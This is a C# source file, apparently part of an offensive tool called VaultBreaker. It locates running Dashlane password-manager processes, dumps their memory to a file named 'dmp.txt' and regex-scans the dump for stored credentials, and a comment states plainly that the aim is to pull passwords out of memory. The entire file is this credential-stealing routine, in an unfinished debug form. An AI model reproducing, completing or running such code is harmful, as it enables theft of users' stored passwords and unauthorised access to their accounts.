using System;
using System.Diagnostics;
using VaultBreaker.Helpers;
using System.IO;
using System.Text.RegularExpressions;

namespace VaultBreaker.Core
{
	//Dashlane uses XML & CDATA for their password storage. Should be easy enough to pull out of memory.

	class Dashlane
	{
		public static void dumpDashlane()
		{
			Process[] procs = Process.GetProcessesByName("Dashlane");
			Process[] all = Process.GetProcesses();

			foreach(var proc in all)
			{
				DebugFunctions.writeDebug(proc.Id + " - " + proc.ProcessName);
			}
			/**
			if(procs.Length < 1)
			{
				DebugFunctions.writeDebug("No Processes Found");
				Console.ReadKey();
			}
	**/
			Console.WriteLine("[DEBUG] Number of Processes Found: {0}", procs.Length);
			foreach (var proc in procs)
			{
				DebugFunctions.writeDebug("Dumping Memory");
				string strResult = DebugFunctions.ReturnCleanASCII(MemoryHelper.dumpProcessMemory(proc).Replace("\0",string.Empty));
				DebugFunctions.writeDebug("Parsing Memory Dump");
				//string r = @"\s{3}(.+)\s{3}receiveNotif";
				string r = @"\s{3}(.+)\0{3}";
				File.WriteAllText("dmp.txt",strResult);
				foreach(Match m in Regex.Matches(strResult, r))
				{
					Console.WriteLine("[DEBUG] '{0}' found at index {1}", DebugFunctions.ReturnCleanASCII(m.Value), m.Index);
				}
				DebugFunctions.writeDebug("Finished");
				Console.ReadKey();
			}
		}
	}
}
